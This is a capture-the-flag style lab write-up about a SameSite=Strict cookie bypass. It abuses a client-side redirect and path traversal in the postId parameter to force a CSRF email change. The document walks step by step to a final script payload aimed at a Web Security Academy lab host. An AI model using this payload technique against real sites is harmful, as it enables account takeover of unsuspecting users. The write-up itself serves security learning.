# SameSite Strict bypass via client-side redirect

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e634db50-9ad5-48ed-8357-fe079046d56f/2024-02-22_19-57.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BDS62HS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQChHQUBIHqU2DDy4ixNbmxtVoKQbfqc0oswHKtpgKEr4gIgNyHBAa1KStzSVJFww9dsXU8Dp4rKjwTcD77VkhI90dEqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPbhma3m%2FugW5enm0ircA89P4JflE%2FhYz94L9cxZx8d9lfOCB1Ijz2ZiuIfF3XOrF8oU2j7aM8NxbZxtuiydn8tuznukHpw0rEGQ0xMWvvLDmfBfrRDvBo4HaNAcSkMDFjZbF9ltPlzFncb1Q8iDa4%2BAfkfhUfDZDluU3EKyZslVKX6f2Tbrva3lRcYMSXSKNcWICL9V015MGhdFSGeulC2Db05cYIsnMgKhjZzegTQmYibcOurCH7uM92YDTTYEP1Dlf2odjC1omCx1%2FFbe1qKM5MuKQfAN1Y7mu6BAkJxQIj3Qf4Lem80kSHtqfY5CoGJGRQ5pMV7bqSmj4rO%2BBkYkhNX5HpilcLmuU4975y4OZdNGjIFrubwLFtZ8aRVabWC60N9lxYHVTun3OLYEWRHnWT0h6IrQB8zJXBX3gn3wHSEZL9Gm002Q%2Bkax64stgo8fsJU4YbmFdb%2FwCmHoCphUxfMhw4sLJjJrc8cIq06spnUy%2B5kLUQg%2Fbq4TKg7nc%2FDwIrXTTVFMMmd9tNpv1Y3Xjvz1Ojd06g81%2BrX4ITclkBkzBHfOuAFRa%2B2hcPcBNdtk%2Fj4u8IVGdxzVMYiiktXvrVyASYtE8QESPGvHePJdsVc0UtEi2R1C4u8RcjgGYIEuwV%2BT0E%2FUYQsUMPaDo9QGOqUBIsXoipZ9pdqzBoXDts%2FwhcVyDBQANQF1N2QoURU7PL1oifKtpH2wes6x%2F1xbltToP4%2BCzfE1uWEyMHYkQi7KrjBy7vWuIhhKR8RxWYF5Ae8DC%2B%2BLP%2Fhx9ynAMasytx8eH38a5xZD4BWAUuT2Kg9cx01FlbnPSrgIKcqtjCdiWchJhZHTXzM%2FnwjxHo8Lzv3Eq4DusQ9IUxcINB8Kh2AItOQlUInC&X-Amz-Signature=58fe4f07272d1178d16848b8abc640cca8ef60cc885351afea2583d7c3538d6f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

it’ll set a new session cookie for us: we can see there is a `SameSite` attribute, which is set to `Strict` restriction.

**Inspect the change-email request **

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/bb6cd652-6676-475b-8f9a-32fed3dd743a/2024-02-22_20-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BDS62HS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQChHQUBIHqU2DDy4ixNbmxtVoKQbfqc0oswHKtpgKEr4gIgNyHBAa1KStzSVJFww9dsXU8Dp4rKjwTcD77VkhI90dEqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPbhma3m%2FugW5enm0ircA89P4JflE%2FhYz94L9cxZx8d9lfOCB1Ijz2ZiuIfF3XOrF8oU2j7aM8NxbZxtuiydn8tuznukHpw0rEGQ0xMWvvLDmfBfrRDvBo4HaNAcSkMDFjZbF9ltPlzFncb1Q8iDa4%2BAfkfhUfDZDluU3EKyZslVKX6f2Tbrva3lRcYMSXSKNcWICL9V015MGhdFSGeulC2Db05cYIsnMgKhjZzegTQmYibcOurCH7uM92YDTTYEP1Dlf2odjC1omCx1%2FFbe1qKM5MuKQfAN1Y7mu6BAkJxQIj3Qf4Lem80kSHtqfY5CoGJGRQ5pMV7bqSmj4rO%2BBkYkhNX5HpilcLmuU4975y4OZdNGjIFrubwLFtZ8aRVabWC60N9lxYHVTun3OLYEWRHnWT0h6IrQB8zJXBX3gn3wHSEZL9Gm002Q%2Bkax64stgo8fsJU4YbmFdb%2FwCmHoCphUxfMhw4sLJjJrc8cIq06spnUy%2B5kLUQg%2Fbq4TKg7nc%2FDwIrXTTVFMMmd9tNpv1Y3Xjvz1Ojd06g81%2BrX4ITclkBkzBHfOuAFRa%2B2hcPcBNdtk%2Fj4u8IVGdxzVMYiiktXvrVyASYtE8QESPGvHePJdsVc0UtEi2R1C4u8RcjgGYIEuwV%2BT0E%2FUYQsUMPaDo9QGOqUBIsXoipZ9pdqzBoXDts%2FwhcVyDBQANQF1N2QoURU7PL1oifKtpH2wes6x%2F1xbltToP4%2BCzfE1uWEyMHYkQi7KrjBy7vWuIhhKR8RxWYF5Ae8DC%2B%2BLP%2Fhx9ynAMasytx8eH38a5xZD4BWAUuT2Kg9cx01FlbnPSrgIKcqtjCdiWchJhZHTXzM%2FnwjxHo8Lzv3Eq4DusQ9IUxcINB8Kh2AItOQlUInC&X-Amz-Signature=96c6df2272b6b5147968a2a8f6079547e83b9539e06a731e39557646736c891c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

It doesn’t have a CSRF token parameter, which helps to prevent CSRF (Cross-Site Request Forgery) attack. So, it may be vulnerable to CSRF.

It send a POST request to `/my-account/change-email`, with parameter `email`, `submit`.

**Change request method to GET**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/740b8a54-220d-463a-8313-c8e9c2486ef8/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BDS62HS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQChHQUBIHqU2DDy4ixNbmxtVoKQbfqc0oswHKtpgKEr4gIgNyHBAa1KStzSVJFww9dsXU8Dp4rKjwTcD77VkhI90dEqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPbhma3m%2FugW5enm0ircA89P4JflE%2FhYz94L9cxZx8d9lfOCB1Ijz2ZiuIfF3XOrF8oU2j7aM8NxbZxtuiydn8tuznukHpw0rEGQ0xMWvvLDmfBfrRDvBo4HaNAcSkMDFjZbF9ltPlzFncb1Q8iDa4%2BAfkfhUfDZDluU3EKyZslVKX6f2Tbrva3lRcYMSXSKNcWICL9V015MGhdFSGeulC2Db05cYIsnMgKhjZzegTQmYibcOurCH7uM92YDTTYEP1Dlf2odjC1omCx1%2FFbe1qKM5MuKQfAN1Y7mu6BAkJxQIj3Qf4Lem80kSHtqfY5CoGJGRQ5pMV7bqSmj4rO%2BBkYkhNX5HpilcLmuU4975y4OZdNGjIFrubwLFtZ8aRVabWC60N9lxYHVTun3OLYEWRHnWT0h6IrQB8zJXBX3gn3wHSEZL9Gm002Q%2Bkax64stgo8fsJU4YbmFdb%2FwCmHoCphUxfMhw4sLJjJrc8cIq06spnUy%2B5kLUQg%2Fbq4TKg7nc%2FDwIrXTTVFMMmd9tNpv1Y3Xjvz1Ojd06g81%2BrX4ITclkBkzBHfOuAFRa%2B2hcPcBNdtk%2Fj4u8IVGdxzVMYiiktXvrVyASYtE8QESPGvHePJdsVc0UtEi2R1C4u8RcjgGYIEuwV%2BT0E%2FUYQsUMPaDo9QGOqUBIsXoipZ9pdqzBoXDts%2FwhcVyDBQANQF1N2QoURU7PL1oifKtpH2wes6x%2F1xbltToP4%2BCzfE1uWEyMHYkQi7KrjBy7vWuIhhKR8RxWYF5Ae8DC%2B%2BLP%2Fhx9ynAMasytx8eH38a5xZD4BWAUuT2Kg9cx01FlbnPSrgIKcqtjCdiWchJhZHTXzM%2FnwjxHo8Lzv3Eq4DusQ9IUxcINB8Kh2AItOQlUInC&X-Amz-Signature=2e9cc9303d2273fc4b5de0a1b89d7adeab01177b88cec0963329a6c698768658&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

It accepts the GET method too

However, in order to exploit CSRF, we first have to **bypass the **`SameSite=Strict`** restriction.**

> 💡 **Strict restriction:**

If a cookie is set with the `SameSite=Strict `attribute, browsers won’t include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.

One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

As far as browsers are concerned, these client-side redirects aren’t really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.

If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.

**Find & Understand the Client Side Redirect**

In the home page, we can view different posts And we can leave some comments.

Let’s leave a test comment:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/62aa176a-6c07-414a-99c8-2dbe3de596c9/2024-02-23_00-31.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BDS62HS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQChHQUBIHqU2DDy4ixNbmxtVoKQbfqc0oswHKtpgKEr4gIgNyHBAa1KStzSVJFww9dsXU8Dp4rKjwTcD77VkhI90dEqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPbhma3m%2FugW5enm0ircA89P4JflE%2FhYz94L9cxZx8d9lfOCB1Ijz2ZiuIfF3XOrF8oU2j7aM8NxbZxtuiydn8tuznukHpw0rEGQ0xMWvvLDmfBfrRDvBo4HaNAcSkMDFjZbF9ltPlzFncb1Q8iDa4%2BAfkfhUfDZDluU3EKyZslVKX6f2Tbrva3lRcYMSXSKNcWICL9V015MGhdFSGeulC2Db05cYIsnMgKhjZzegTQmYibcOurCH7uM92YDTTYEP1Dlf2odjC1omCx1%2FFbe1qKM5MuKQfAN1Y7mu6BAkJxQIj3Qf4Lem80kSHtqfY5CoGJGRQ5pMV7bqSmj4rO%2BBkYkhNX5HpilcLmuU4975y4OZdNGjIFrubwLFtZ8aRVabWC60N9lxYHVTun3OLYEWRHnWT0h6IrQB8zJXBX3gn3wHSEZL9Gm002Q%2Bkax64stgo8fsJU4YbmFdb%2FwCmHoCphUxfMhw4sLJjJrc8cIq06spnUy%2B5kLUQg%2Fbq4TKg7nc%2FDwIrXTTVFMMmd9tNpv1Y3Xjvz1Ojd06g81%2BrX4ITclkBkzBHfOuAFRa%2B2hcPcBNdtk%2Fj4u8IVGdxzVMYiiktXvrVyASYtE8QESPGvHePJdsVc0UtEi2R1C4u8RcjgGYIEuwV%2BT0E%2FUYQsUMPaDo9QGOqUBIsXoipZ9pdqzBoXDts%2FwhcVyDBQANQF1N2QoURU7PL1oifKtpH2wes6x%2F1xbltToP4%2BCzfE1uWEyMHYkQi7KrjBy7vWuIhhKR8RxWYF5Ae8DC%2B%2BLP%2Fhx9ynAMasytx8eH38a5xZD4BWAUuT2Kg9cx01FlbnPSrgIKcqtjCdiWchJhZHTXzM%2FnwjxHo8Lzv3Eq4DusQ9IUxcINB8Kh2AItOQlUInC&X-Amz-Signature=a107288472c9e226319720804f63576226ad53207d062429e5412b167d7e4d30&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/0893e271-ef59-4e3a-8280-b06cd6ea63d2/2024-02-22_21-23.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BDS62HS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQChHQUBIHqU2DDy4ixNbmxtVoKQbfqc0oswHKtpgKEr4gIgNyHBAa1KStzSVJFww9dsXU8Dp4rKjwTcD77VkhI90dEqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPbhma3m%2FugW5enm0ircA89P4JflE%2FhYz94L9cxZx8d9lfOCB1Ijz2ZiuIfF3XOrF8oU2j7aM8NxbZxtuiydn8tuznukHpw0rEGQ0xMWvvLDmfBfrRDvBo4HaNAcSkMDFjZbF9ltPlzFncb1Q8iDa4%2BAfkfhUfDZDluU3EKyZslVKX6f2Tbrva3lRcYMSXSKNcWICL9V015MGhdFSGeulC2Db05cYIsnMgKhjZzegTQmYibcOurCH7uM92YDTTYEP1Dlf2odjC1omCx1%2FFbe1qKM5MuKQfAN1Y7mu6BAkJxQIj3Qf4Lem80kSHtqfY5CoGJGRQ5pMV7bqSmj4rO%2BBkYkhNX5HpilcLmuU4975y4OZdNGjIFrubwLFtZ8aRVabWC60N9lxYHVTun3OLYEWRHnWT0h6IrQB8zJXBX3gn3wHSEZL9Gm002Q%2Bkax64stgo8fsJU4YbmFdb%2FwCmHoCphUxfMhw4sLJjJrc8cIq06spnUy%2B5kLUQg%2Fbq4TKg7nc%2FDwIrXTTVFMMmd9tNpv1Y3Xjvz1Ojd06g81%2BrX4ITclkBkzBHfOuAFRa%2B2hcPcBNdtk%2Fj4u8IVGdxzVMYiiktXvrVyASYtE8QESPGvHePJdsVc0UtEi2R1C4u8RcjgGYIEuwV%2BT0E%2FUYQsUMPaDo9QGOqUBIsXoipZ9pdqzBoXDts%2FwhcVyDBQANQF1N2QoURU7PL1oifKtpH2wes6x%2F1xbltToP4%2BCzfE1uWEyMHYkQi7KrjBy7vWuIhhKR8RxWYF5Ae8DC%2B%2BLP%2Fhx9ynAMasytx8eH38a5xZD4BWAUuT2Kg9cx01FlbnPSrgIKcqtjCdiWchJhZHTXzM%2FnwjxHo8Lzv3Eq4DusQ9IUxcINB8Kh2AItOQlUInC&X-Amz-Signature=1094870895a060c955d2c2eb329aca1b0ba0c4ff7dccb0ad1c456447fb1213d7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

After we send the request, it’ll fetch a JavaScript file:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/fb9ef1eb-a927-412b-96dc-23e4328e074a/2024-02-23_00-32.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BDS62HS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQChHQUBIHqU2DDy4ixNbmxtVoKQbfqc0oswHKtpgKEr4gIgNyHBAa1KStzSVJFww9dsXU8Dp4rKjwTcD77VkhI90dEqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPbhma3m%2FugW5enm0ircA89P4JflE%2FhYz94L9cxZx8d9lfOCB1Ijz2ZiuIfF3XOrF8oU2j7aM8NxbZxtuiydn8tuznukHpw0rEGQ0xMWvvLDmfBfrRDvBo4HaNAcSkMDFjZbF9ltPlzFncb1Q8iDa4%2BAfkfhUfDZDluU3EKyZslVKX6f2Tbrva3lRcYMSXSKNcWICL9V015MGhdFSGeulC2Db05cYIsnMgKhjZzegTQmYibcOurCH7uM92YDTTYEP1Dlf2odjC1omCx1%2FFbe1qKM5MuKQfAN1Y7mu6BAkJxQIj3Qf4Lem80kSHtqfY5CoGJGRQ5pMV7bqSmj4rO%2BBkYkhNX5HpilcLmuU4975y4OZdNGjIFrubwLFtZ8aRVabWC60N9lxYHVTun3OLYEWRHnWT0h6IrQB8zJXBX3gn3wHSEZL9Gm002Q%2Bkax64stgo8fsJU4YbmFdb%2FwCmHoCphUxfMhw4sLJjJrc8cIq06spnUy%2B5kLUQg%2Fbq4TKg7nc%2FDwIrXTTVFMMmd9tNpv1Y3Xjvz1Ojd06g81%2BrX4ITclkBkzBHfOuAFRa%2B2hcPcBNdtk%2Fj4u8IVGdxzVMYiiktXvrVyASYtE8QESPGvHePJdsVc0UtEi2R1C4u8RcjgGYIEuwV%2BT0E%2FUYQsUMPaDo9QGOqUBIsXoipZ9pdqzBoXDts%2FwhcVyDBQANQF1N2QoURU7PL1oifKtpH2wes6x%2F1xbltToP4%2BCzfE1uWEyMHYkQi7KrjBy7vWuIhhKR8RxWYF5Ae8DC%2B%2BLP%2Fhx9ynAMasytx8eH38a5xZD4BWAUuT2Kg9cx01FlbnPSrgIKcqtjCdiWchJhZHTXzM%2FnwjxHo8Lzv3Eq4DusQ9IUxcINB8Kh2AItOQlUInC&X-Amz-Signature=5598aa520d45c8aba1059684b5ebdc833b10f8572337f09955b3203a4a848c91&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

When we go to `/post/comment/confirmation`, it’ll run that JavaScript:

- After 3 seconds, redirect user to `/post/<postId>`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/96991d29-353c-4165-9378-acf6cd0d9507/2024-02-22_21-25.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664BDS62HS%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221851Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQChHQUBIHqU2DDy4ixNbmxtVoKQbfqc0oswHKtpgKEr4gIgNyHBAa1KStzSVJFww9dsXU8Dp4rKjwTcD77VkhI90dEqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPbhma3m%2FugW5enm0ircA89P4JflE%2FhYz94L9cxZx8d9lfOCB1Ijz2ZiuIfF3XOrF8oU2j7aM8NxbZxtuiydn8tuznukHpw0rEGQ0xMWvvLDmfBfrRDvBo4HaNAcSkMDFjZbF9ltPlzFncb1Q8iDa4%2BAfkfhUfDZDluU3EKyZslVKX6f2Tbrva3lRcYMSXSKNcWICL9V015MGhdFSGeulC2Db05cYIsnMgKhjZzegTQmYibcOurCH7uM92YDTTYEP1Dlf2odjC1omCx1%2FFbe1qKM5MuKQfAN1Y7mu6BAkJxQIj3Qf4Lem80kSHtqfY5CoGJGRQ5pMV7bqSmj4rO%2BBkYkhNX5HpilcLmuU4975y4OZdNGjIFrubwLFtZ8aRVabWC60N9lxYHVTun3OLYEWRHnWT0h6IrQB8zJXBX3gn3wHSEZL9Gm002Q%2Bkax64stgo8fsJU4YbmFdb%2FwCmHoCphUxfMhw4sLJjJrc8cIq06spnUy%2B5kLUQg%2Fbq4TKg7nc%2FDwIrXTTVFMMmd9tNpv1Y3Xjvz1Ojd06g81%2BrX4ITclkBkzBHfOuAFRa%2B2hcPcBNdtk%2Fj4u8IVGdxzVMYiiktXvrVyASYtE8QESPGvHePJdsVc0UtEi2R1C4u8RcjgGYIEuwV%2BT0E%2FUYQsUMPaDo9QGOqUBIsXoipZ9pdqzBoXDts%2FwhcVyDBQANQF1N2QoURU7PL1oifKtpH2wes6x%2F1xbltToP4%2BCzfE1uWEyMHYkQi7KrjBy7vWuIhhKR8RxWYF5Ae8DC%2B%2BLP%2Fhx9ynAMasytx8eH38a5xZD4BWAUuT2Kg9cx01FlbnPSrgIKcqtjCdiWchJhZHTXzM%2FnwjxHo8Lzv3Eq4DusQ9IUxcINB8Kh2AItOQlUInC&X-Amz-Signature=5316c746413b466754cc5090cb33535e694c167652f97b46ff83d34b9283ef68&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, the GET parameter `postId` is fully under attacker’s control!

**Now, what if I change the path to **`/my-account`** via path traversal?**

- Start crafting our payload

```html
/post/comment/confirmation?postId=6
```

- Change payload to redirect to my-account page

```html
/post/comment/confirmation?postId=my-account/
```

- Add a traversal attack to our payload

```html
/post/comment/confirmation?postId=../my-account/
```

- Modify payload to change our email

```html
/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com&submit=1
```

- URL encode ampersand `&` may its not able to determine when our mail ends

```html
/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com%26submit=1
```

- Craft out final payload

```html
<script>
window. location = "https://0ad1003704e4d04e8077d6250056008f.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com%26submit=1
</script>
```

- Deliver our final payload to the victim
